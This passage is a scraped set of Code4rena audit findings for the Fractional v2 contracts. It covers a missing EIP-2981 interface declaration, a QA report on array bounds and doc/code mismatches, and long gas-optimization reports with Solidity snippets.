vyper  The contracts are all written entirely in solidity. Writing contracts with vyper instead of solidity can save gas.  Source https://twitter.com/eiber_david/status/1515737811881807876 doggo demonstrates https://twitter.com/fubuloubu/status/1528179581974417414?t=-hcq_26JFDaHdAQZ-wYxCA&s=19  ## Recommended Mitigation Steps  Write some or all of the contracts in vyper to save gas"}, {"title": "The `FERC1155.sol` don't respect the EIP2981", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/544", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-07-fractional-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-07-fractional/blob/main/src/FERC1155.sol#L31-L34   # Vulnerability details  ## Impact  The [EIP-2981: NFT Royalty Standard](https://eips.ethereum.org/EIPS/eip-2981) implementation is incomplete, missing the implementation of `function supportsInterface(bytes4 interfaceID) external view returns (bool);` from the [EIP-165: Standard Interface Detection](https://eips.ethereum.org/EIPS/eip-165)  ## Proof of Concept  A marketplace implemented royalties could check if the NFT have royalties, but if don't add the interface of `ERC2981` on the `_registerInterface`, the marketplace can't know if this NFT haves  ## Tools Used  Manual Review  ## Recommended Mitigation Steps  Like in [solmate ERC1155.sol](https://github.com/Rari-Capital/solmate/blob/03e425421b24c4f75e4a3209b019b367847b7708/src/tokens/ERC1155.sol#L137-L146) add the `ERC2981` interfaceId on the `FERC1155` contract ```solidity     /*//////////////////////////////////////////////////////////////                               ERC165 LOGIC     //////////////////////////////////////////////////////////////*/      function supportsInterface(bytes4 interfaceId) public view  override returns (bool) {         return             super.supportsInterface(interfaceId) ||             interfaceId == 0x2a55205a; // ERC165 Interface ID for ERC2981     } ```  "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/540", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-07-fractional-findings", "body": "## Low severity: BaseVault.sol deployVault() will revert if there are more than 6 Permissions in _modules  The list of Permission hashes is fixed at length 6 in generateMerkleTree [here](https://github.com/code-423n4/2022-07-fractional/blob/f862c14f86adf7de232cd4e9cca6b611e6023b98/src/modules/protoforms/BaseVault.sol#L128): ``` hashes = new bytes32[](6); ```  However the _modules passed to deployVault might have more Permissions than 6.   **If there are more than 6 Permissions deployVault() will revert with raiseOutOfBounds**.  Consider counting up the number of Permissions first before creating the hashes array. Migration.generateMerkleTree does this [here]( https://github.com/code-423n4/2022-07-fractional/blob/f862c14f86adf7de232cd4e9cca6b611e6023b98/src/modules/Migration.sol#L487): ``` uint256 treeLength; uint256 modulesLength = _modules.length;  unchecked {     for (uint256 i; i < modulesLength; ++i) {         treeLength += IModule(_modules[i]).getLeafNodes().length;     } } ```  Marking low severity as if this limit is hit, a new protoform contract could be built, deployed and used. ie. it's not built into core contracts like the VaultRegistry.  ## Non-critical (until gas costs change): Vault.sol gas reserve setting not future proof'd like the one in PRBProxy  From the prb-proxy repo [README.md](https://github.com/paulrberg/prb-proxy/blob/main/README.md) `A minimum gas reserve is saved in storage such that the proxy does not become unusable if EVM opcode gas costs change in the future.`  In Vault.sol it's a `constant` so can't be modified in the future without redeploying the Vault and VaultFactory contracts.  This was probably done to save gas but consider making it modifiable for the future. Some Vault's will continue working for a long time and it's possible gas costs will change again in the future.  In the worst case the Vaults would fail to execute transactions due to out of gas failures.  **I marked this non-critical but if opcode costs were to change this could potentially become a high or critical.**  NOTE: This issue could also apply to `COST_PER_WORD` in Transfer.sol however there is a path to swap plugins and migrate Vaults to use new modules so it's less of an issue in contracts like Transfer.  ## Non-critical: FERC1155.sol implements EIP-2981 but does not include it in supportsInterface  There is no mention of the EIP2981 standard in the docs or code but the FERC1155 does implement that standard.  So it would benefit from returning true for calls to `supportsInterface(0x2a55205a)`. see https://eips.ethereum.org/EIPS/eip-2981 for details of the interface.  With that in place exchanges can see the standard is supported and attempt to honor the royalty setting.  ## Non-critical: Buyout percentage inconsistency between docs and code  The docs mention 51% as the required buyout threshold multiple times. For example `If a pool has more than 51% of the total supply after 4 days, the buyout is successful`. See https://docs.fractional.art/fractional-v2-1/smart-contracts/modules/buyout.  However the Buyout.sol logic uses 50%. For example see the check in the end() function here: https://github.com/code-423n4/2022-07-fractional/blob/f862c14f86adf7de232cd4e9cca6b611e6023b98/src/modules/Buyout.sol#L211.  Update either the docs or the code so they are consistently using one of either 50% or 51%.  ## Non-critical: Vault.sol state variable nonce can be bool  `nonce` in Vault.sol is used as a flag to indicate if the Vault has been initialized or not. However it's stored as a uint256.  Changing it to a bool would make it's purpose and usage a little clearer. It would also save 20k deployment gas if the `nonce` declaration was moved above `merkleRoot` when changed to bool. This is because it can share a slot with the address `owner`.  ## Non-critical: IBuyout.sol duplicates 2 functions from the parent IModule.sol  Functions `getLeafNodes` an `getPermissions` can be removed from IBuyout.sol as they are already defined in the parent contract IModule.sol. "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/508", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-07-fractional-findings", "body": "# Gas Report  ## Table of Contents  - [Array length should not be looked up in every iteration](#array-length-should-not-be-looked-up-in-every-iteration) - [Bytes constant are cheaper than string constants](#bytes-constants-are-cheaper-than-string-constants) - [Caching storage variables in local variables to save gas](#caching-storage-variables-in-local-variables-to-save-gas) - [Caching mapping accesses in local variables to save gas](#caching-mapping-accesses-in-local-variables-to-save-gas) - [Calldata instead of memory for RO function parameters](#calldata-instead-of-memory-for-ro-function-parameters) - [Constant expressions](#constant-expressions) - [Constants can be private](#constants-can-be-private) - [Custom errors](#custom-errors) - [Empty blocks should emit an event](#empty-blocks-should-emit-an-event) - [Event fields are redundant](#event-fields-are-redundant) - [Functions with access control cheaper if payable](#functions-with-access-control-cheaper-if-payable) - [Immutable variables save storage](#immutable-variables-save-storage) - [Inline functions](#inline-functions) - [Mathematical optimizations](#mathematical-optimizations) - [Modifier instead of duplicate require](#modifier-instead-of-duplicate-require) - [Prefix increments](#prefix-increments) - [Revert strings length](#revert-strings-length) - [Shifting cheaper than division](#shifting-cheaper-than-division) - [Storage cheaper than memory](#storage-cheaper-than-memory) - [Storage pointer for structs](#storage-pointer-for-structs) - [Transfers should be avoided if amount null](#transfers-should-be-avoided-if-amount-null) - [unchecked arithmetic](#unchecked-arithmetic) - [unnecessary computation](#unnecessary-computation)   # Array length should not be looked up in every iteration  ## IMPACT  It wastes gas to read an array's length in every iteration of a `for` loop, even if it is a memory or calldata array: `3` gas per read.   ## PROOF OF CONCEPT  8 instances:  ### src/modules/Buyout.sol  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L454 ```cpp 454:         for (uint256 i; i < permissions.length; ) ```  ### src/modules/protoforms/BaseVault.sol  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/protoforms/BaseVault.sol#L64 ```cpp 64:         for (uint256 i = 0; i < _tokens.length; ) ```  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/protoforms/BaseVault.sol#L83 ```cpp 83:         for (uint256 i = 0; i < _tokens.length; ) ```  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/protoforms/BaseVault.sol#L107 ```cpp 107:         for (uint256 i = 0; i < _tokens.length; ++i) ```  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/protoforms/BaseVault.sol#L130 ```cpp 130:             for (uint256 i; i < _modules.length; ++i)  ```  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/protoforms/BaseVault.sol#L132 ```cpp 132:             for (uint256 j; j < leaves.length; ++j)  ```  ### src/utils/MerkleBase.sol  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/utils/MerkleBase.sol#L51 ```cpp 51:             for (uint256 i = 0; i < _proof.length; ++i) ```  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/utils/MerkleBase.sol#L110 ```cpp 110:             for (uint256 i; i < result.length; ++i) ```  ## TOOLS USED  Manual Analysis  ## MITIGATION  Caching the length in a variable before the `for` loop   # Bytes constant are cheaper than string constants  ## IMPACT  If the string can fit into 32 bytes, then `bytes32` is cheaper than `string`. `string`  is a dynamically sized-type, which has current limitations in Solidity compared to a statically sized variable.    ## PROOF OF CONCEPT  2 instances:  ### src/FERC1155.sol  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/FERC1155.sol#L15 ```cpp 15:     string public constant NAME = \"FERC1155\"; ```  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/FERC1155.sol#L17 ```cpp 15:     string public constant VERSION = \"1\"; ```  ## TOOLS USED  Manual Analysis  ## MITIGATION  Replace `string constant` with `bytes(1..32) constant`  # Caching storage variables in local variables to save gas  ## IMPACT  Anytime you are reading from storage more than once, it is cheaper in gas cost to cache the variable: a SLOAD cost 100gas, while MLOAD and MSTORE cost 3 gas.  In particular, in `for` loops, when using the length of a storage array as the condition being checked after each loop, caching the array length can yield significant gas savings if the array length is high  ## PROOF OF CONCEPT  15 instances:  ### src/modules/Buyout.sol  scope: `end()`  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L186 - `registry` is read twice:  ```cpp 186:         (address token, uint256 id) = IVaultRegistry(registry).vaultToToken(_vault); 210:                IVaultRegistry(registry) ```  scope: `cash()`  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L246 - `registry` is read twice:  ```cpp 246:         (address token, uint256 id) = IVaultRegistry(registry).vaultToToken(_vault); 267:        uint256 totalSupply = IVaultRegistry(registry).totalSupply(_vault); ```  scope: `redeem()`  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L280 - `registry` is read twice:  ```cpp 280:         (, uint256 id) = IVaultRegistry(registry).vaultToToken(_vault); 288:         uint256 totalSupply = IVaultRegistry(registry).totalSupply(_vault); ```  scope: `getPermissions()`  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L476 - `supply` is read twice:  ```cpp 476:             supply, 477:             ISupply(supply).burn.selector ```  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L482 - `transfer` is read 8 times:  ```cpp 482:             transfer, 483:             ITransfer(transfer).ERC20Transfer.selector 488:             transfer, 489:             ITransfer(transfer).ERC721TransferFrom.selector 494:             transfer, 495:             ITransfer(transfer).ERC1155TransferFrom.selector 500:             transfer, 501:             ITransfer(transfer).ERC1155BatchTransferFrom.selector ```   ### src/modules/Migrations.sol  scope: `propose()`  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L81 - `registry` is read twice:  ```cpp 81:         (, uint256 id) = IVaultRegistry(registry).vaultToToken(_vault); 95:         proposal.oldFractionSupply = IVaultRegistry(registry).totalSupply(_vault); ```  scope: `commit()`  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L184 - `registry` is read twice:  ```cpp 184:         (address token, uint256 id) = IVaultRegistry(registry).vaultToToken(_vault); 200:             IVaultRegistry(registry).totalSupply(_vault) ```  - `buyout` is read twice in the conditionnal `if` block:  ```cpp 208:             IFERC1155(token).setApprovalFor(address(buyout), id, true) 210:             IBuyout(buyout).start{value: proposal.totalEth}(_vault); ```  scope: `settleVault()`  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L232 - `proposal.modules` is read twice:  ```cpp 232:         bytes32[] memory merkleTree = generateMerkleTree(proposal.modules); 247:             proposal.modules ```  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L237 - `proposal.plugins` is read twice:  ```cpp 237:             proposal.plugins 248:             proposal.plugins ```  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L238 - `proposal.selectors` is read twice:  ```cpp 238:             proposal.selectors 249:             proposal.selectors ```   scope: `settleFractions()`  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L273 - `proposal.newVault` is read twice:  ```cpp 273:             proposal.newVault 283:             proposal.newVault ```  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L275 - `proposal.newFractionSupply` is read twice:  ```cpp 275:             proposal.newFractionSupply 285:             proposal.newFractionSupply ```  scope: `migrateFractions()`  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L435 - `registry` is read 3 times:  ```cpp 435:         (, uint256 id) = IVaultRegistry(registry).vaultToToken(_vault) 467:         (address token, uint256 newFractionId) = IVaultRegistry(registry) 470:         uint256 newTotalSupply = IVaultRegistry(registry).totalSupply(newVault) ```  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L438 - `buyout` is read twice:  ```cpp 438:         (, address proposer, State current, , , ) = IBuyout(buyout).buyoutInfo(_vault) 447:         (, , , , , uint256 lastTotalSupply) = IBuyout(buyout).buyoutInfo(_vault); ```   ## TOOLS USED  Manual Analysis  ## MITIGATION  cache these storage variables using local variables.  # Caching mapping accesses in local variables to save gas  ## IMPACT  Anytime you are reading from a mapping value more than once, it is cheaper in gas cost to cache it, by saving one `gkeccak256` operation - `30` gas.   ## PROOF OF CONCEPT  1 instance:  ### src/FERC1155.sol  scope: `uri()`  - `metadata[_id]` is read twice:  ```cpp 297:        require(metadata[_id] != address(0), \"NO METADATA\"); 298:         return IFERC1155(metadata[_id]).uri(_id) ```  ## TOOLS USED  Manual Analysis  ## MITIGATION  cache these mapping accesses using local variables.  # Calldata instead of memory for RO function parameters  ## PROBLEM  If a reference type function parameter is read-only, it is cheaper in gas to use calldata instead of memory. Calldata is a non-modifiable, non-persistent area where function arguments are stored, and behaves mostly like memory,but it alleviates the compiler from the `abi.decode()` step that copies each index of the calldata to the memory index, each iteration costing `60` gas.   ## PROOF OF CONCEPT  20 instances:  ### src/FERC1155.sol  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/FERC1155.sol#L68 ```cpp 68:     function emitSetURI(uint256 _id, string memory _uri)  ```  ### src/Vault.sol  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L73 ```cpp 73:     function install(bytes4[] memory _selectors, address[] memory _plugins) ```  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L101 ```cpp 101:     function uninstall(bytes4[] memory _selectors) ```  ### src/VaultRegistry.sol  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/VaultRegistry.sol#L53 ```cpp 53:         address[] memory _plugins 54:         bytes4[] memory _selectors ```  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/VaultRegistry.sol#L70 ```cpp 70:         address[] memory _plugins 71:         bytes4[] memory _selectors ```  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/VaultRegistry.sol#L85 ```cpp 85:         address[] memory _plugins 86:         bytes4[] memory _selectors ```  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/VaultRegistry.sol#L105 ```cpp 105:         address[] memory _plugins 106:         bytes4[] memory _selectors ```  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/VaultRegistry.sol#L150 ```cpp 150:         address[] memory _plugins 151:         bytes4[] memory _selectors ```  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/VaultRegistry.sol#L168 ```cpp 168:         address[] memory _plugins 169:         bytes4[] memory _selectors ```  ### src/modules/Migration.sol  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L487 ```cpp 487:     function generateMerkleTree(address[] memory _modules) ```  ### src/utils/MerkleBase.sol  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/utils/MerkleBase.sol#L44 ```cpp 44:     function verifyProof(bytes32[] memory _proof) ```  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/utils/MerkleBase.sol#L125 ```cpp 125:     function hashLevel(bytes32[] memory _data) ```  ### src/utils/Metadata.sol  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/utils/Metadata.sol#L24 ```cpp 24:     function setURI(uint256 _id, string memory _uri)  ```  ## TOOLS USED  Manual Analysis  ## MITIGATION  Replace `memory` with `calldata`   # Constant expressions  ## IMPACT  Constant expressions are [re-calculated each time they are in use](https://github.com/ethereum/solidity/issues/9232), costing an extra `97` gas than a constant every time they are called.   ## PROOF OF CONCEPT  3 instances include:  ### src/constants/Permit.sol  ```cpp 5: bytes32 constant DOMAIN_TYPEHASH = keccak256( 6:     \"EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)\" 7: ); 8:  9: /// @dev The EIP-712 typehash for the permit struct used by the contract 10: bytes32 constant PERMIT_TYPEHASH = keccak256( 11:     \"Permit(address owner,address operator,uint256 tokenId,bool approved,uint256 nonce,uint256 deadline)\" 12: ); 13:  14: /// @dev The EIP-712 typehash for the permit all struct used by the contract 15: bytes32 constant PERMIT_ALL_TYPEHASH = keccak256( 16:     \"PermitAll(address owner,address operator,bool approved,uint256 nonce,uint256 deadline)\" 17: ); ```  ## TOOLS USED  Manual Analysis  ## MITIGATION  Mark these as `immutable` instead of `constant`  # Constants can be private  ## IMPACT  Marking constants as `private` save gas upon deployment, as the compiler does not have to create getter functions for these variables. It is worth noting that a `private` variable can still be read using either the verified contract source code or the bytecode. This may affect readability so this is left at the team's discretion  ## PROOF OF CONCEPT  6 instances:  ### src/VaultRegistry.sol  ```cpp 17:     address public immutable factory; 18:     /// @notice Address of FERC1155 token contract 19:     address public immutable fNFT; 20:     /// @notice Address of Implementation for FERC1155 token contract 21:     address public immutable fNFTImplementation; ```  ### src/modules/Buyout.sol  ```cpp 35:    uint256 public constant PROPOSAL_PERIOD = 2 days; 36:     /// @notice Time length of the rejection period 37:     uint256 public constant REJECTION_PERIOD = 4 days; ```  ### src/modules/Migration.sol  ```cpp 43:     uint256 public constant PROPOSAL_PERIOD = 7 days; ```    ## TOOLS USED  Manual Analysis  ## MITIGATION  Make the constants `private` instead of `public`   # Custom Errors  ## IMPACT  Custom errors from Solidity 0.8.4 are cheaper than revert strings (cheaper deployment cost and runtime cost when the revert condition is met) while providing the same amount of information, as explained [here](https://blog.soliditylang.org/2021/04/21/custom-errors/)  Custom errors are defined using the error statement  ## PROOF OF CONCEPT  5 instances:  ### src/FERC1155.sol  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/FERC1155.sol#L263-L268 ```cpp 263:         require( 264:             msg.sender == _from || 265:                 isApprovedForAll[_from][msg.sender] || 266:                 isApproved[_from][msg.sender][_id], 267:             \"NOT_AUTHORIZED\" 268:         ) ```  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/FERC1155.sol#L275-L286 ```cpp 275:         require( 276:             _to.code.length == 0 277:                 ? _to != address(0) 278:                 : INFTReceiver(_to).onERC1155Received( 279:                     msg.sender, 280:                     _from, 281:                     _id, 282:                     _amount, 283:                     _data 284:                 ) == INFTReceiver.onERC1155Received.selector, 285:             \"UNSAFE_RECIPIENT\" 286:         ); ```  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/FERC1155.sol#L297 ```cpp 297:         require(metadata[_id] != address(0), \"NO METADATA\"); ```  ### src/utils/MerkleBase.sol  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/utils/MerkleBase.sol#L62 ```cpp 62:         require(_data.length > 1, \"wont generate root for single leaf\"); ```  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/utils/MerkleBase.sol#L78 ```cpp 78:         require(_data.length > 1, \"wont generate root for single leaf\"); ```  ## TOOLS USED  Manual Analysis  ## MITIGATION  Replace require and revert statements with custom errors.  For instance, in `FERC1155.sol`:  ```diff -297:         require(metadata[_id] != address(0), \"NO METADATA\"); +if (metadata[_id] == address(0)) { +  revert NoMetadata(); +} ```  and define the custom error in the contract  ```diff +error NoMetadata(); ```  - original gas costs:\\ \u256d\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256e \u2502 FERC1155 contract \u2506                 \u2506       \u2506        \u2506       \u2506         \u2502 \u255e\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2561 \u2502 Deployment Cost   \u2506 Deployment Size \u2506       \u2506        \u2506       \u2506         \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 1863562           \u2506 9340            \u2506       \u2506        \u2506       \u2506         \u2502 \u2570\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256f  - new gas costs with the changes made above - ie one require statement changed into a custom error:\\ \u256d\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256e \u2502 FERC1155 contract \u2506                 \u2506       \u2506        \u2506       \u2506         \u2502 \u255e\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2561 \u2502 Deployment Cost   \u2506 Deployment Size \u2506       \u2506        \u2506       \u2506         \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 1857755           \u2506 9311            \u2506       \u2506        \u2506       \u2506         \u2502 \u2570\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256f  - `5807` gas saved upon deployment.  # Empty blocks should emit an event  ## PROBLEM  Empty blocks should emit an event, or revert. If not, they can simply be removed to save gas upon deployment. This is valid for `receive()` functions, but also `constructors`  ## PROOF OF CONCEPT  4 instances:  ### src/Vault.sol  https://github.com/code-423n4/2022-07-fracti"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/507", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "old-submission-method"], "target": "2022-07-fractional-findings", "body": "## Summary  ### Gas Optimizations | |Issue|Instances| |-|:-|:-:| | [G&#x2011;01] | Check the first bit of the number rather than using the modulo operator, to save gas | 1 | | [G&#x2011;02] | Multiple `address`/ID mappings can be combined into a single `mapping` of an `address`/ID to a `struct`, where appropriate | 2 | | [G&#x2011;03] | State variables only set in the constructor should be declared `immutable` | 70 | | [G&#x2011;04] | Structs can be packed into fewer storage slots | 1 | | [G&#x2011;05] | Using `calldata` instead of `memory` for read-only arguments in `external` functions saves gas | 15 | | [G&#x2011;06] | Using `storage` instead of `memory` for structs/arrays saves gas | 2 | | [G&#x2011;07] | State variables should be cached in stack variables rather than re-reading them from storage | 27 | | [G&#x2011;08] | Multiple accesses of a mapping/array should use a local variable cache | 1 | | [G&#x2011;09] | `internal` functions only called once can be inlined to save gas | 3 | | [G&#x2011;10] | `<array>.length` should not be looked up in every loop of a `for`-loop | 8 | | [G&#x2011;11] | `++i`/`i++` should be `unchecked{++i}`/`unchecked{i++}` when it is not possible for them to overflow, as is the case when used in `for`- and `while`-loops | 2 | | [G&#x2011;12] | `require()`/`revert()` strings longer than 32 bytes cost extra gas | 2 | | [G&#x2011;13] | Optimize names to save gas | 28 | | [G&#x2011;14] | Using `bool`s for storage incurs overhead | 1 | | [G&#x2011;15] | `++i` costs less gas than `i++`, especially when it's used in `for`-loops (`--i`/`i--` too) | 3 | | [G&#x2011;16] | Using `private` rather than `public` for constants, saves gas | 5 | | [G&#x2011;17] | Division by two should use bit shifting | 3 | | [G&#x2011;18] | Empty blocks should be removed or emit something | 3 | | [G&#x2011;19] | Use custom errors rather than `revert()`/`require()` strings to save gas | 5 | | [G&#x2011;20] | Functions guaranteed to revert when called by normal users can be marked `payable` | 6 |  Total: 188 instances over 20 issues   ## Gas Optimizations  ### [G&#x2011;01]  Check the first bit of the number rather than using the modulo operator, to save gas Do the same sort of bit check as is on line 135  *There is 1 instance of this issue:* ```solidity File: src/utils/MerkleBase.sol  91:                  if (_node % 2 == 1) {  ``` https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/utils/MerkleBase.sol#L91  ### [G&#x2011;02]  Multiple `address`/ID mappings can be combined into a single `mapping` of an `address`/ID to a `struct`, where appropriate Saves a storage slot for the mapping. Depending on the circumstances and sizes of types, can avoid a Gsset (**20000 gas**) per mapping combined. Reads and subsequent writes can also be cheaper when a function requires both values and they both fit in the same storage slot. 